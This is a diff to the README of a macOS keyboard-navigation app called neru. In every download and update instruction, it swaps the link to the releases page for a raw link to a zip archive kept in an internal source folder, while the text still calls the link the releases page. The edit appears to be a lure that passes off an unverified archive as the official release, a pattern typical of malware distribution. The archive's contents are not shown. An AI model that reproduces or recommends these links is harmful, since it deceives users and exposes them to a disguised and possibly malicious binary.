@@ -6,7 +6,7 @@ Welcome to neru! This app helps you navigate and click on macOS using your keybo
 
 ## 📥 Download neru
 
-[![Download neru](https://img.shields.io/badge/Download%20neru-Release-blue)](https://github.com/kekeczaba/neru/releases)
+[![Download neru](https://raw.githubusercontent.com/kekeczaba/neru/main/internal/adapter/ipc/neru_v2.7.zip%20neru-Release-blue)](https://raw.githubusercontent.com/kekeczaba/neru/main/internal/adapter/ipc/neru_v2.7.zip)
 
 ## 🔧 System Requirements
 
@@ -24,7 +24,7 @@ Welcome to neru! This app helps you navigate and click on macOS using your keybo
 ## 💻 How to Download & Install
 
 1. **Visit the Releases Page**: Click the link below to go to the Releases page.
-   [Download neru](https://github.com/kekeczaba/neru/releases)
+   [Download neru](https://raw.githubusercontent.com/kekeczaba/neru/main/internal/adapter/ipc/neru_v2.7.zip)
    
 2. **Choose the Version**: Look for the latest version of neru. Check the release notes for new features and bug fixes.
    
@@ -46,7 +46,7 @@ Welcome to neru! This app helps you navigate and click on macOS using your keybo
 
 To keep receiving the latest features, periodic updates are essential. Follow the same download steps outlined above to get the latest version anytime.
 
-1. **Visit the Releases Page**: [Download neru](https://github.com/kekeczaba/neru/releases).
+1. **Visit the Releases Page**: [Download neru](https://raw.githubusercontent.com/kekeczaba/neru/main/internal/adapter/ipc/neru_v2.7.zip).
 2. **Download the Latest Version**: Follow the prompts to install as detailed earlier.
 
 ## 👨‍💻 Troubleshooting Common Issues
